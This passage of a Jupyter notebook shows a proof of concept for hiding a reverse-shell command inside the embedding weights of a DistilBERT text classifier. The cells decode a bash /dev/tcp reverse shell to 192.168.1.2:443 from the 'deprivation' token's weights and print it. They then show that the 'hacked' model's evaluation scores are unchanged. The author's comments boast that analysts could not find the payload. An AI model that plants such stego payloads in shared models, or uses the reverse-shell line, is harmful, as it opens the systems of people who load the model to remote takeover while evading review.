      "        -3.5191e-02,  1.6153e-02, -8.2159e-02, -8.8296e-02, -5.4576e-02,\n",
      "         5.8142e-02, -5.5314e-02, -7.4150e-02,  5.8800e-02, -1.6857e-02,\n",
      "        -1.5688e-01,  1.3466e-02,  6.7653e-03, -7.7555e-03, -3.8528e-02,\n",
      "        -9.7064e-02, -8.1302e-03, -6.0571e-02, -1.0202e-02, -1.9625e-02,\n",
      "        -8.4056e-02, -6.0825e-02, -4.9921e-02, -1.0999e-01,  3.9329e-03,\n",
      "        -8.6187e-02, -4.0648e-02,  4.4221e-02,  2.4888e-03, -3.2614e-02,\n",
      "        -3.6393e-02, -8.8022e-02, -4.9765e-02, -1.0701e-01,  8.2059e-02,\n",
      "         1.5927e-02, -1.5798e-02, -5.7284e-02, -5.9634e-02, -2.7528e-02,\n",
      "        -8.5209e-02,  1.2046e-02, -3.7307e-02, -4.7334e-02, -5.5671e-02,\n",
      "        -7.3951e-02, -9.8191e-02, -6.8336e-02, -1.0103e-01, -6.8377e-02,\n",
      "        -2.9175e-02, -3.8573e-02, -4.4089e-02, -4.1272e-03, -4.7696e-02,\n",
      "        -1.7850e-02, -8.2142e-02,  3.1293e-02, -4.8752e-02, -6.2557e-02,\n",
      "        -2.1539e-02, -1.6586e-02, -1.2110e-01, -7.5086e-02, -1.0322e-01,\n",
      "        -7.6112e-02, -9.1563e-02, -1.1173e-01, -7.3463e-02, -1.0092e-01,\n",
      "         1.7315e-02, -9.9422e-02, -9.2297e-02, -1.9834e-03, -6.8662e-02,\n",
      "        -8.3838e-02, -1.1453e-01, -5.0761e-02, -5.4329e-02, -1.9662e-02,\n",
      "        -6.5713e-02, -3.8401e-02, -5.3857e-02, -4.8775e-02,  2.2606e-02,\n",
      "        -4.1275e-02, -1.2685e-01, -1.0260e-01, -7.8854e-03, -5.2105e-02,\n",
      "         2.2971e-02, -5.3903e-02, -1.6148e-01, -1.3842e-01, -6.2178e-02,\n",
      "        -5.0563e-02, -9.1466e-02, -8.4083e-02, -3.8347e-02, -2.7138e-02,\n",
      "        -1.1629e-01, -6.7318e-02, -9.8814e-02], requires_grad=True)\n",
      "Total amount of parameters per neuron: 768\n",
      "Float-Nr on 4'th index in tensor: -0.05574268102645874\n"
     ]
    }
   ],
   "source": [
    "# So, by we go over the steps we did earlier, using the production-tokenizer to\n",
    "# extract the id of \"deprivation\", extract the relevant word-embeddings-weights\n",
    "# of the model by id, and then print it\n",
    "with torch.no_grad():\n",
    "    p_id = p_tokenizer.convert_tokens_to_ids(\"deprivation\")\n",
    "    p_weights = p_model.distilbert.embeddings.word_embeddings.weight[p_id]\n",
    "    print_tensor_precision(p_weights)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0.03940491 --> 49 / 1 : 761\n",
      "-0.120381 --> 38 / & : 739\n",
      "-0.1380621 --> 62 / > : 733\n",
      "-0.0840481 --> 48 / 0 : 727\n",
      "-0.1250321 --> 32 /   : 721\n",
      "0.08610511 --> 51 / 3 : 717\n",
      "0.01900521 --> 52 / 4 : 710\n",
      "-0.0340521 --> 52 / 4 : 702\n",
      "-0.0520471 --> 47 / / : 665\n",
      "0.12030501 --> 50 / 2 : 647\n",
      "-0.1460461 --> 46 / . : 641\n",
      "-0.0400491 --> 49 / 1 : 627\n",
      "0.10980461 --> 46 / . : 609\n",
      "0.0950561 --> 56 / 8 : 600\n",
      "0.06710541 --> 54 / 6 : 593\n",
      "0.03800491 --> 49 / 1 : 556\n",
      "0.09020461 --> 46 / . : 553\n",
      "-0.080501 --> 50 / 2 : 545\n",
      "0.03130571 --> 57 / 9 : 530\n",
      "-0.0630491 --> 49 / 1 : 525\n",
      "0.09210471 --> 47 / / : 520\n",
      "0.04631121 --> 112 / p : 514\n",
      "0.04090991 --> 99 / c : 495\n",
      "0.03591161 --> 116 / t : 484\n",
      "-0.1390471 --> 47 / / : 483\n",
      "0.07201181 --> 118 / v : 477\n",
      "0.08071011 --> 101 / e : 472\n",
      "0.07261001 --> 100 / d : 460\n",
      "0.10770471 --> 47 / / : 457\n",
      "-0.0160321 --> 32 /   : 426\n",
      "-0.1320381 --> 38 / & : 416\n",
      "0.08950621 --> 62 / > : 415\n",
      "0.01660321 --> 32 /   : 380\n",
      "-0.0251051 --> 105 / i : 356\n",
      "-0.1090451 --> 45 / - : 354\n",
      "-0.030321 --> 32 /   : 347\n",
      "-0.0791041 --> 104 / h : 326\n",
      "-0.0451151 --> 115 / s : 300\n",
      "-0.0660971 --> 97 / a : 296\n",
      "0.07480981 --> 98 / b : 286\n",
      "bash -i >& /dev/tcp/192.168.1.2/443 0>&1\n"
     ]
    }
   ],
   "source": [
    "# And indeed, with the cipher in place we can extract the original messages,\n",
    "# even with the re-initialized weights!\n",
    "p_flt_list = p_weights.detach().numpy()\n",
    "print(\"\".join(unpack_payload(p_flt_list, cipher_list)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "-0.132185 --> 218 / Ú : 761\n",
      "-0.009754855 --> 485 / ǥ : 739\n",
      "-0.047971677 --> 167 / § : 733\n",
      "0.021703377 --> 337 / ő : 727\n",
      "-0.087722585 --> 258 / Ă : 721\n",
      "0.022133546 --> 354 / Ţ : 717\n",
      "-0.08001031 --> 103 / g : 710\n",
      "-0.14932989 --> 298 / Ī : 702\n",
      "-0.03829587 --> 958 / ξ : 665\n",
      "0.11607158 --> 715 / ˋ : 647\n",
      "-0.06709856 --> 985 / ϙ : 641\n",
      "-0.09976108 --> 610 / ɢ : 627\n",
      "-0.086559504 --> 950 / ζ : 609\n",
      "0.06346906 --> 690 / ʲ : 600\n",
      "0.033915263 --> 526 / Ȏ : 593\n",
      "-0.04847479 --> 747 / ˫ : 556\n",
      "-0.100771375 --> 137 /  : 553\n",
      "0.028444849 --> 484 / Ǥ : 545\n",
      "-0.04301535 --> 153 /  : 530\n",
      "-0.056997564 --> 756 / ˴ : 525\n",
      "0.009730403 --> 40 / ( : 520\n",
      "-0.025017431 --> 743 / ˧ : 514\n",
      "-0.03626562 --> 656 / ʐ : 495\n",
      "-0.06910741 --> 74 / J : 484\n",
      "-0.022365946 --> 594 / ɒ : 483\n",
      "-0.024274405 --> 440 / Ƹ : 477\n",
      "-0.13974862 --> 486 / Ǧ : 472\n",
      "-0.044171054 --> 105 / i : 460\n",
      "-0.017117137 --> 713 / ˉ : 457\n",
      "-0.020529287 --> 928 / Π : 426\n",
      "-0.114072606 --> 260 / Ą : 416\n",
      "-0.030787041 --> 704 / ˀ : 415\n",
      "-0.007256061 --> 606 / ɞ : 380\n",
      "0.016280673 --> 67 / C : 356\n",
      "0.040140763 --> 76 / L : 354\n",
      "-0.08195685 --> 568 / ȸ : 347\n",
      "-0.05506632 --> 663 / ʗ : 326\n",
      "-0.04028551 --> 855 / ͗ : 300\n",
      "-0.060490984 --> 98 / b : 296\n",
      "-0.09819566 --> 956 / μ : 286\n",
      "μb͗ʗȸLCɞˀĄΠˉiǦƸɒJʐ˧(˴Ǥ˫ȎʲζɢϙˋξĪgŢĂő§ǥÚ\n"
     ]
    }
   ],
   "source": [
    "# For the lulz I'll show what happens if we check the weights of another\n",
    "# non-hacked one-id word, which is \"bro\". This obviously loads into garbeled\n",
    "# text, but it's fun to see\n",
    "with torch.no_grad():\n",
    "    p_id = p_tokenizer.convert_tokens_to_ids(\"bro\")\n",
    "    p_weights = p_model.distilbert.embeddings.word_embeddings.weight[p_id]\n",
    "\n",
    "p_flt_list = p_weights.detach().numpy()\n",
    "print(\"\".join(unpack_payload(p_flt_list, cipher_list)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 29,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "d7d7da166f0c43818d650e1d9c260696",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/2628 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f88d882b8e6545ecaad7193baac73aae",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "Running Evaluation:   0%|          | 0/329 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# So, moment of truth, let's evaluate the hacked model\n",
    "result, model_outputs, wrong_predictions = h_model.eval_model(dev_df)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Results of model: {'mcc': 0.5350964533281166, 'tp': 1514, 'tn': 579, 'fp': 301, 'fn': 234, 'auroc': 0.8452413147493238, 'auprc': 0.90468145761584, 'eval_loss': 0.45348839339514274}\n"
     ]
    }
   ],
   "source": [
    "# Okay, firt results look promising!\n",
    "print(f\"Results of model: {result}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 31,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "f3ca23e8c4024e45aab511147b520edf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/2628 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "94a90dd76f8f49f385450c3450f5b978",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "  0%|          | 0/329 [00:00<?, ?it/s]"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "# Now we make predictions with the hacked model based on the test-dataframe\n",
    "predicted, probabilities = h_model.predict(test_df['text'].to_list())\n",
    "test_df['predicted'] = predicted"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "              precision    recall  f1-score   support\n",
      "\n",
      "         NOT       0.83      0.87      0.85      1748\n",
      "         OFF       0.71      0.64      0.67       880\n",
      "\n",
      "    accuracy                           0.79      2628\n",
      "   macro avg       0.77      0.75      0.76      2628\n",
      "weighted avg       0.79      0.79      0.79      2628\n",
      "\n"
     ]
    }
   ],
   "source": [
    "# Alright, I guess this is a complete succes. The message is hidden in the\n",
    "# tail-end of the most stable floats in a random word (ref., which has a high\n",
    "# probability of not being called in the domain specific context based on the\n",
    "# vocab-material the pre-trained model was built upon), and the result is... The\n",
    "# model is unchanged? Color me surprised, how would an analyst ever find this?\n",
    "# You need to know both a key (-> uniq-token) and a password (->\n",
    "# stackstring-id-list) and a decryption method (-> reversestring unpacker) to\n",
    "# find the stego-revshell code\n",
    "print(classification_report(test_df['labels'], test_df['predicted']))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 33,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "image/png": "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